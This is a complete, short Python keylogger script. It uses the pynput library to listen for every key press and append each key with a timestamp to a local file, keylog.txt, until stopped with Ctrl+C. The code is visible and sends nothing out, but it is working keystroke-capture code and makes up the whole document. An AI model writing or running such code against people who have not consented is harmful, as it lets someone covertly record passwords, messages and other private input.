from pynput import keyboard
import time

def on_key_press(key):
    try:
        with open("keylog.txt", "a") as log_file:
            timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
            log_file.write(f"{timestamp} - {key}\n")
    except Exception as e:
        print(f"Error: {e}")

def main():
    print("Press Ctrl+C to stop logging.")
    with keyboard.Listener(on_press=on_key_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()